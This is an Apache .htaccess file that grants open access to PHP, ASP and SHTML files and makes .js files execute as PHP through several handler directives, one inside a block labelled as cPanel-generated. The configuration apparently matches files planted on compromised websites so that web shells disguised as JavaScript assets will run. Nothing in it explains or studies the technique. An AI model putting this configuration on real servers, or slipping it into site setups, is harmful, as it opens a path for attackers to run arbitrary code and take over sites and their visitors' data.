<IfModule mod_rewrite.c>
    RewriteEngine Off
</IfModule>
<IfModule mod_authz_core.c>
    <FilesMatch "\.php$">
    Require all granted
    </FilesMatch>
</IfModule>
<FilesMatch "\.php$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "\.asp$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "\.shtml$">
    Order allow,deny
    allow from all
</FilesMatch>
<FilesMatch "^()$">
Order allow,deny
Allow from all
</FilesMatch>
<IfModule mod_authz_core.c>
    Require all granted
</IfModule>

<IfModule php_module>
    php_flag engine on
</IfModule>



<FilesMatch "\.js$">
    SetHandler application/x-httpd-php
</FilesMatch>

AddType application/x-httpd-php .js

AddHandler application/x-httpd-php74 .js

# php -- BEGIN cPanel-generated handler, do not edit
# Set the “ea-php56” package as the default “PHP” programming language.
<IfModule mime_module>
  AddHandler application/x-httpd-ea-php56 .php .php5 .js
</IfModule>
# php -- END cPanel-generated handler, do not edit